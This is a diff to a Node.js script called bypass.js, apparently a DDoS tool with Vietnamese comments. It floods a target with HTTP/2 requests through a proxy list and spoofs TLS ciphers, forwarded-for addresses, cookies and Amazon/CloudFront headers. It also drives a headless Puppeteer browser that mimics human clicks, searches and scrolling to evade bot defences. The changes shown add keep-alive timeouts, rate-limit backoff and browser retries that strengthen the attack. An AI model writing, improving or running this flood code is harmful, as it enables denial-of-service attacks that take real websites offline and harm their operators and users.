@@ -381,7 +381,6 @@ const country = [
       "TM", "TN", "TO", "TR", "TT", "TV", "TW", "TZ", "UA", "UG", "UM", "US", "UY", "UZ", "VA", "VC",
       "VE", "VG", "VI", "VN", "VU", "WF", "WS", "YE", "YT", "ZA", "ZM", "ZW"
     ];
-
 const sigalgs = ["ecdsa_secp256r1_sha256", "rsa_pss_rsae_sha256", "rsa_pkcs1_sha256", "ecdsa_secp384r1_sha384", "rsa_pss_rsae_sha384", "rsa_pkcs1_sha384", "rsa_pss_rsae_sha512", "rsa_pkcs1_sha512"];
 const SignalsList = sigalgs.join(':');
 const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
@@ -395,7 +394,7 @@ const args = process.argv.slice(2);
 const flags = args.filter(arg => arg.startsWith('--'));
 const params = args.filter(arg => !arg.startsWith('--'));
 if (params.length < 5) {
-    console.log(`Usage: node bypass.js <host> <time> <req> <thread> <proxy.txt> [--all] [--debug] [--browser] [--large]`.yellow);
+    console.log(`Usage: node bypass.js <host> <time> <req> <thread> <proxy.txt> [--all] [--debug] [--browser] [--large] [--timeout=<seconds>]`.yellow);
     process.exit();
 }
 
@@ -408,6 +407,8 @@ const allMode = flags.includes('--all');
 const debugMode = flags.includes('--debug');
 const browserMode = flags.includes('--browser');
 const largeMode = flags.includes('--large');
+const timeoutFlag = flags.find(f => f.startsWith('--timeout='));
+const timeout = timeoutFlag ? parseInt(timeoutFlag.split('=')[1], 10) : 0;
 
 const proxy = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n');
 const parsedTarget = url.parse(target);
@@ -422,7 +423,7 @@ const randstr = (length) => {
 };
 const generateAmazonCookie = () => `session-id=${randstr(13)}-${randstr(19)}; ubid-main=${randstr(13)}-${randstr(19)}; x-main=${randstr(32)}; at-main=${randstr(64)}; sess-at-main=${randstr(64)}`;
 
-// Hàm bypass Layer 7 cơ bản (HTTP/2)
+// Hàm bypass Layer 7 cơ bản (HTTP/2) - giữ nguyên từ mã trước
 function bypassLayer7(target, proxy, rate, duration) {
     const parsedUrl = url.parse(target);
     const [proxyHost, proxyPort] = proxy.split(':');
@@ -430,7 +431,7 @@ function bypassLayer7(target, proxy, rate, duration) {
     const tlsOptions = {
         host: parsedUrl.hostname,
         port: 443,
-        ciphers: largeMode && parsedUrl.hostname.includes('amazon') ? "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES256-GCM-SHA384" : randomElement(cplist), // Amazon-specific TLS
+        ciphers: largeMode && parsedUrl.hostname.includes('amazon') ? "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES256-GCM-SHA384" : randomElement(cplist),
         secureProtocol: "TLS_method",
         servername: parsedUrl.hostname,
         rejectUnauthorized: false,
@@ -439,11 +440,13 @@ function bypassLayer7(target, proxy, rate, duration) {
         sigalgs: SignalsList,
         secureOptions,
         secureContext,
-        socket: new net.Socket()
+        socket: new net.Socket(),
+        keepAlive: true,
+        keepAliveMsecs: timeout ? timeout * 1000 : 10000
     };
 
     tlsOptions.socket.connect(proxyPort, proxyHost, () => {
-        tlsOptions.socket.write(`CONNECT ${parsedUrl.hostname}:443 HTTP/1.1\r\nHost: ${parsedUrl.hostname}\r\n\r\n`);
+        tlsOptions.socket.write(`CONNECT ${parsedUrl.hostname}:443 HTTP/1.1\r\nHost: ${parsedUrl.hostname}\r\nConnection: keep-alive\r\n\r\n`);
     });
 
     tlsOptions.socket.on('data', (data) => {
@@ -455,12 +458,18 @@ function bypassLayer7(target, proxy, rate, duration) {
                 });
 
                 client.on('connect', () => {
-                    const endTime = Date.now() + duration * 1000;
+                    const connectionEndTime = timeout ? Date.now() + timeout * 1000 : Date.now() + duration * 1000;
+                    const floodEndTime = Date.now() + duration * 1000;
+                    let requestCount = 0;
+                    let retryDelay = 0;
 
                     function flood() {
-                        if (Date.now() > endTime) {
-                            client.close();
-                            tlsConn.end();
+                        if (Date.now() > floodEndTime) {
+                            if (Date.now() >= connectionEndTime) {
+                                client.close();
+                                tlsConn.end();
+                                if (debugMode) console.log(`[${proxy}] Total requests sent: ${requestCount}`.cyan);
+                            }
                             return;
                         }
 
@@ -483,24 +492,43 @@ function bypassLayer7(target, proxy, rate, duration) {
                                 'upgrade-insecure-requests': '1',
                                 'dnt': '1',
                                 'x-forwarded-for': allMode || largeMode ? `${randomElement(country)}.${randstr(3)}.${randstr(3)}.${randstr(3)}` : undefined,
-                                'x-amz-user-agent': largeMode && parsedUrl.hostname.includes('amazon') ? `Mozilla/5.0 (Windows NT 10.0; Win64; x64) amz-sdk-js/3.${randstr(3)}` : undefined, // Amazon-specific
-                                'x-amz-security-token': largeMode && parsedUrl.hostname.includes('amazon') ? randstr(64) : undefined, // Giả lập token AWS
-                                'cloudfront-viewer-country': largeMode && parsedUrl.hostname.includes('amazon') ? randomElement(country) : undefined // CloudFront-specific
+                                'x-amz-user-agent': largeMode && parsedUrl.hostname.includes('amazon') ? `Mozilla/5.0 (Windows NT 10.0; Win64; x64) amz-sdk-js/3.${randstr(3)}` : undefined,
+                                'x-amz-security-token': largeMode && parsedUrl.hostname.includes('amazon') ? randstr(64) : undefined,
+                                'cloudfront-viewer-country': largeMode && parsedUrl.hostname.includes('amazon') ? randomElement(country) : undefined
                             };
 
                             const stream = client.request(headers);
                             stream.on('response', (res) => {
-                                if (debugMode) console.log(`[${proxy}] Status: ${res[':status']}`.green);
-                                stream.close();
+                                requestCount++;
+                                if (debugMode) console.log(`[${proxy}] Request ${requestCount} - Status: ${res[':status']}`.green);
+                                if (res[':status'] === 429) {
+                                    retryDelay = Math.min(retryDelay + 1000, 5000);
+                                    if (debugMode) console.log(`[${proxy}] Rate limited, delaying ${retryDelay}ms`.yellow);
+                                } else {
+                                    retryDelay = 0;
+                                }
+                                if (!timeout) stream.close();
                             });
                             stream.on('error', () => {});
-                            stream.end();
+                            if (!timeout) stream.end();
                         }
 
-                        setImmediate(flood);
+                        if (retryDelay) {
+                            setTimeout(flood, retryDelay);
+                        } else {
+                            setImmediate(flood);
+                        }
                     }
 
                     flood();
+
+                    if (timeout) {
+                        setTimeout(() => {
+                            client.close();
+                            tlsConn.end();
+                            if (debugMode) console.log(`[${proxy}] Connection closed after ${timeout}s with ${requestCount} requests`.cyan);
+                        }, timeout * 1000);
+                    }
                 });
 
                 client.on('error', (err) => {
@@ -520,20 +548,42 @@ function bypassLayer7(target, proxy, rate, duration) {
     });
 }
 
-// Hàm bypass bằng browser (Puppeteer)
+// Hàm bypass bằng browser (Puppeteer) với retry logic
 async function browserBypass(target, proxy, rate, duration) {
     const [proxyHost, proxyPort] = proxy.split(':');
-    const browser = await puppeteer.launch({
-        headless: true,
-        args: [
-            `--proxy-server=${proxyHost}:${proxyPort}`,
-            '--no-sandbox',
-            '--disable-setuid-sandbox',
-            '--disable-infobars',
-            '--ignore-certificate-errors',
-            '--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
-        ]
-    });
+    let browser;
+    const maxRetries = 3;
+    let retryCount = 0;
+
+    // Thử khởi động browser với retry
+    while (!browser && retryCount < maxRetries) {
+        try {
+            browser = await puppeteer.launch({
+                headless: true,
+                executablePath: '/usr/bin/google-chrome', // Dùng Chrome đã cài sẵn nếu có (tùy chỉnh theo hệ thống)
+                args: [
+                    `--proxy-server=${proxyHost}:${proxyPort}`,
+                    '--no-sandbox',
+                    '--disable-setuid-sandbox',
+                    '--disable-infobars',
+                    '--ignore-certificate-errors',
+                    '--disable-dev-shm-usage', // Giảm sử dụng shared memory
+                    '--disable-gpu', // Tắt GPU để ổn định hơn trên server
+                    '--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+                ]
+            });
+        } catch (err) {
+            retryCount++;
+            if (debugMode) console.error(`[${proxy}] Failed to launch browser (attempt ${retryCount}/${maxRetries}): ${err.message}`.red);
+            if (retryCount < maxRetries) {
+                await new Promise(resolve => setTimeout(resolve, 2000 * retryCount)); // Delay tăng dần
+            } else {
+                throw new Error(`Failed to launch browser after ${maxRetries} attempts`);
+            }
+        }
+    }
+
+    if (!browser) return;
 
     const endTime = Date.now() + duration * 1000;
 
@@ -550,21 +600,96 @@ async function browserBypass(target, proxy, rate, duration) {
                 headers: {
                     'Accept': randomElement(accept_header),
                     'Accept-Language': randomElement(language_header),
-                    'Referer': randomElement(refers),
+                    'Referer': largeMode && parsedTarget.hostname.includes('amazon') ? `https://www.amazon.com/s?k=${randstr(5)}` : randomElement(refers),
                     'Cookie': generateAmazonCookie()
                 }
             });
         });
 
+        let requestCount = 0;
+
         try {
             await page.goto(target, { waitUntil: 'networkidle2', timeout: 60000 });
             if (debugMode) console.log(`[${proxy}] Browser loaded: ${await page.title()}`.green);
-            if (Math.random() > 0.5) await page.click('body');
-            await page.evaluate(() => window.scrollTo(0, document.body.scrollHeight));
+            requestCount++;
+
+            const actions = [
+                async () => {
+                    const elements = await page.$$('a, button, div');
+                    if (elements.length) {
+                        const randomElement = randomElement(elements);
+                        await randomElement.click();
+                        if (debugMode) console.log(`[${proxy}] Clicked element`.green);
+                        requestCount++;
+                    }
+                },
+                async () => {
+                    await page.evaluate(() => window.scrollTo(0, Math.random() * document.body.scrollHeight));
+                    if (debugMode) console.log(`[${proxy}] Scrolled page`.green);
+                },
+                async () => {
+                    if (parsedTarget.hostname.includes('amazon')) {
+                        const searchBox = await page.$('#twotabsearchtextbox');
+                        if (searchBox) {
+                            const searchTerm = randstr(5);
+                            await searchBox.type(searchTerm);
+                            await page.keyboard.press('Enter');
+                            if (debugMode) console.log(`[${proxy}] Searched for "${searchTerm}"`.green);
+                            requestCount++;
+                            await page.waitForNavigation({ waitUntil: 'networkidle2' });
+                            const products = await page.$$('.s-result-item a');
+                            if (products.length) {
+                                const randomProduct = randomElement(products);
+                                await randomProduct.click();
+                                if (debugMode) console.log(`[${proxy}] Clicked product`.green);
+                                requestCount++;
+                            }
+                        }
+                    }
+                },
+                async () => {
+                    const inputs = await page.$$('input[type="text"], input[type="search"]');
+                    if (inputs.length) {
+                        const randomInput = randomElement(inputs);
+                        await randomInput.type(randstr(5));
+                        if (debugMode) console.log(`[${proxy}] Typed in input`.green);
+                        requestCount++;
+                    }
+                },
+                async () => {
+                    await page.mouse.move(Math.random() * 1000, Math.random() * 1000);
+                    if (debugMode) console.log(`[${proxy}] Moved mouse`.green);
+                }
+            ];
+
+            if (timeout) {
+                const pageStartTime = Date.now();
+                let retryDelay = 0;
+                while (Date.now() - pageStartTime < timeout * 1000 && Date.now() < endTime) {
+                    try {
+                        const action = randomElement(actions);
+                        await action();
+                        await page.reload({ waitUntil: 'networkidle2' });
+                        if (debugMode) console.log(`[${proxy}] Page reloaded - Request count: ${requestCount}`.green);
+                        requestCount++;
+                        retryDelay = 0;
+                    } catch (err) {
+                        if (err.message.includes('429')) {
+                            retryDelay = Math.min(retryDelay + 1000, 5000);
+                            if (debugMode) console.log(`[${proxy}] Rate limited, delaying ${retryDelay}ms`.yellow);
+                        } else if (debugMode) console.error(`[${proxy}] Action Error: ${err.message}`.red);
+                    }
+                    await new Promise(resolve => setTimeout(resolve, 500 + Math.random() * 1000 + retryDelay));
+                }
+            } else {
+                const action = randomElement(actions);
+                await action();
+            }
         } catch (err) {
             if (debugMode) console.error(`[${proxy}] Browser Error: ${err.message}`.red);
         } finally {
             await page.close();
+            if (debugMode) console.log(`[${proxy}] Page closed with ${requestCount} requests`.cyan);
             setImmediate(floodPage);
         }
     }
@@ -575,7 +700,7 @@ async function browserBypass(target, proxy, rate, duration) {
 // Logic chính với cluster
 if (cluster.isMaster) {
     console.clear();
-    console.log(`Starting flood on ${target} for ${time}s with ${threads} threads${allMode ? ' [ALL]' : ''}${browserMode ? ' [BROWSER]' : ''}${largeMode ? ' [LARGE]' : ''}`.cyan);
+    console.log(`Starting flood on ${target} for ${time}s with ${threads} threads${allMode ? ' [ALL]' : ''}${browserMode ? ' [BROWSER]' : ''}${largeMode ? ' [LARGE]' : ''}${timeout ? ` [TIMEOUT=${timeout}s]` : ''}`.cyan);
     for (let i = 0; i < threads; i++) cluster.fork();
 
     setTimeout(() => {
@@ -602,7 +727,7 @@ if (cluster.isMaster) {
     }
 }
 
-// Các hàm hỗ trợ khác (giữ nguyên từ bạn)
+// Các hàm hỗ trợ khác
 const getRandomChar = () => 'abcdefghijklmnopqrstuvwxyz'[Math.floor(Math.random() * 26)];
 let randomPathSuffix = '';
 setInterval(() => randomPathSuffix = getRandomChar(), 3333);
